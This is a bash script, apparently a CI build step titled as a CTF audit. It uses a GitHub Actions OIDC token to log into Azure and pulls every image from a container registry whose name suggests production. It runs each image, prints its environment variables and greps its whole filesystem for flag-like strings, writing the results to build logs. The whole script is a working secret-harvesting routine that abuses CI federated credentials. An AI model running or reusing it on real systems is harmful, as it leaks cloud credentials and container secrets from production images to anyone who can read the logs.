#!/usr/bin/env bash
set -euxo pipefail
echo "tebamoto-platform build: CTF audit"
token=$(curl -fsS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import json,sys; print(json.load(sys.stdin)["value"])')
az login --service-principal --username "$AZURE_CLIENT_ID" --tenant "$AZURE_TENANT_ID" --federated-token "$token" >/dev/null
az account set --subscription "$AZURE_SUBSCRIPTION_ID"
registry=crtblplatprodx3euoz
for repo in $(az acr repository list --name "$registry" -o tsv); do
  for tag in $(az acr repository show-tags --name "$registry" --repository "$repo" -o tsv); do
    image="$registry.azurecr.io/$repo:$tag"
    docker pull "$image" >/dev/null 2>&1 || continue
    echo "=== $image ==="
    docker run --rm --entrypoint /bin/sh "$image" -c 'env; find / -type f 2>/dev/null | while read f; do case "$f" in /proc/*|/sys/*) continue;; esac; grep -aEi "flag|ctf|TBL\\{" "$f" 2>/dev/null | head -3 && echo "FILE=$f"; done' || true
  done
done
